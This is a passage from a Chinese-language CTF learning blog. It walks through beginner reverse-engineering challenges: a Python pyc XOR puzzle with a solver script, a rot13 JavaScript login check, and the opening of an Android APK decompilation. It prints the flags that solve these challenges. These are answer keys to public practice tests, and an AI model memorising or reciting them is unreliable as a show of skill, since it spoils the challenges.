operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    dword_601078 <span class="token operator">=</span> v6<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    dword_60107C <span class="token operator">=</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_601060<span class="token punctuation">;</span>    <span class="token function">sub_400686</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dword_601078<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_601060<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> dword_601078<span class="token punctuation">;</span>    <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> dword_60107C<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400770</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> a2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NO NO NO~ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulation!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You seccess half\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do not forget to change input to hex and combine~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ByeBye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明天再说</p><h2 id="注册程序的破解-CTF向"><a href="#注册程序的破解-CTF向" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id><a href="#" class="headerlink" title=" "></a> </h3><h2 id="其他文件逆向"><a href="#其他文件逆向" class="headerlink" title="其他文件逆向"></a>其他文件逆向</h2><h3 id="pyc文件逆向"><a href="#pyc文件逆向" class="headerlink" title="pyc文件逆向"></a>pyc文件逆向</h3><h4 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h4><p><strong>考的知识点</strong></p><p>主要是<code>异或</code>、<code>取模</code>的特性，都很简单，这里就不再多做介绍了。异或的特性主要就是<code>a^a^b=b</code></p><p><strong>解题过程</strong></p><p>懒得再下函数库了，直接<a href="https://tool.lu/pyc/">在线网站</a>搞算了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit http://tool.lu/pyc/ for more information</span><span class="token keyword">print</span> <span class="token string">'Welcome to Re World!'</span><span class="token keyword">print</span> <span class="token string">'Your input1 is your flag~'</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>input1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span>    code <span class="token operator">+=</span> num<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span> codecode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span><span class="token string">'\x12'</span><span class="token punctuation">,</span><span class="token string">'\x1d'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'\x01'</span><span class="token punctuation">,</span><span class="token string">'\x06'</span><span class="token punctuation">,</span><span class="token string">'\x14'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'\x1b'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'\x01'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'\x13'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逆向的脚本如下，这里是老逆向知识考点了，感觉很老很老的了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit http://tool.lu/pyc/ for more information</span><span class="token triple-quoted-string string">"""print('Welcome to Re World!')print('Your input1 is your flag~')input1 = 'flag'code = ''l = len(input1)for i in range(l):    num = ((ord(input1[i]) + i) % 128 + 128) % 128    code += chr(num)for i in range(l - 1):    code[i] = code[i] ^ code[i + 1]"""</span>code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span> <span class="token string">'\x12'</span><span class="token punctuation">,</span> <span class="token string">'\x1d'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'\x06'</span><span class="token punctuation">,</span> <span class="token string">'\x14'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'\x1b'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span>        <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'\x13'</span><span class="token punctuation">]</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># GWHT&#123;Just_Re_1s_Ha66y!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="js文件逆向"><a href="#js文件逆向" class="headerlink" title="js文件逆向"></a>js文件逆向</h3><p>这里的主要考点应该主要是对于算法的逆向，这种题目往往比较简单，没有什么复杂的逻辑（应该），经常作为签到题目出现。</p><h4 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h4><p>给出的是一个html的网页，主要逆向里面的js内容的算法，其中js的内容如下</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"prompt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> flag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">var</span> rotFlag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[a-zA-Z]/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&lt;=</span> <span class="token string">"Z"</span> <span class="token operator">?</span> <span class="token number">90</span> <span class="token operator">:</span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> c <span class="token operator">:</span> c <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz"</span> <span class="token operator">==</span> rotFlag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Correct flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Incorrect flag, rot again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要负责对flag内容进行转换的是下面的功能代码，稍微改了下成了能看懂的样子。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> rotFlag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[a-zA-Z]/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span>c <span class="token operator">&lt;=</span> <span class="token string">"Z"</span> <span class="token operator">?</span> <span class="token number">90</span> <span class="token operator">:</span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> c <span class="token operator">:</span> c <span class="token operator">-</span> <span class="token number">26</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那个<code>replace</code>函数负责遍历所有大小写字母，后面的<code>function</code>主要负责进行转换，将每个大小写字母带入其中即可，其中<code>90-&gt;&#39;Z&#39;</code>、<code>122-&gt;&#39;z&#39;</code>。后面的就很简单了，</p><ol><li>如果该字符是大写字母就将<code>Z</code>的ASCII码值与<code>c本身的ASCII码值+13</code>进行比较</li><li>如果<code>Z</code>比较大，就返回c本身的字符串，</li><li>反之则返回c的ASCII码值<code>-26</code>的数值所代表的ASCII字符。</li><li>小写字母是亦同理。</li></ol><p>这就是非常经典的rot13密码了，rot13密码是凯撒密码的延申。它的加解密是对等的</p><p><img src="/2021/05/28/CTF/image-20210531174558489.png" alt="image-20210531174558489"></p><p>rot13密码是经典的凯撒密码，凯撒密码移位13位就是rot13了，本身是没有什么技术难度的，（口算都能破解）</p><p><img src="/2021/05/28/CTF/image-20210531174817470.png" alt="image-20210531174817470"></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="方向介绍"><a href="#方向介绍" class="headerlink" title="方向介绍"></a>方向介绍</h2><p>这个方向本来是分属于reverse方向的，但是呢，最近的CTF赛题看起来有将mobile移动安全专门划分出来的趋势，再加上我个人对移动安全也十分感兴趣，所以也将mobile单独分类出来。也是为了便于日后总结学习。</p><h2 id="一般Android逆向"><a href="#一般Android逆向" class="headerlink" title="一般Android逆向"></a>一般Android逆向</h2><h3 id="buu、findit"><a href="#buu、findit" class="headerlink" title="buu、findit"></a>buu、findit</h3><p><strong>题目描述</strong></p><p>不知不觉，小明长大了，变成了一个程序员，虽然很苦逼，但是偶尔编写个小东西坑害公司新人还是蛮好玩的。新人小萌一天问小明wifi账号密码，一分钟后，小萌收到了一个文件。小萌想了好久都没得到密码，怎么办，女朋友要买东西，流量告罄，没wifi上不了网，不买就分手，是时候该展现月老的实力了兄弟们！代表月亮惩罚小明！得出答案。 注意：得到的 flag 请包上 flag{} 提交</p><p><a href="https://files.buuoj.cn/files/7b8602971727c6c82ec0d360d5cad2c0/6a428ff2-25d7-403c-b28e-3f980a10a5a2.apk?token=eyJ1c2VyX2lkIjo1ODI5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyMTV9.YLL-JQ.1mkBIGgecp2UxMwmP7W7hIN_9NM"> buu在线题目附件地址</a></p><p><strong>解题过程</strong></p><p>给出的是一个apk文件，遇到这种先在模拟器中打开看一看软件的主要逻辑。</p><p><img src="/2021/05/28/CTF/image-20210530102603082.png" alt="image-20210530102603082"></p><p>看这种感觉应该是内部已经生成答案了，但是就是没显示出来。用jadx打开之后找到MainActivity函数，反编译出来的java代码如下所示</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>findit</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>os<span class="token punctuation">.</span></span><span class="token class-name">Bundle</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>support<span class="token punctuation">.</span>v7<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">ActionBarActivity</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">MenuItem</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">View</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">Button</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">EditText</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">TextView</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainActivity</span> <span class="token keyword">extends</span> <span class="token class-name">ActionBarActivity</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* access modifiers changed from: protected */</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_main<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">EditText</span> edit <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">EditText</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">TextView</span> text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TextView</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Button</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">.</span><span class="token class-name">OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: com.example.findit.MainActivity.1</span>            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'I'</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'i'</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                    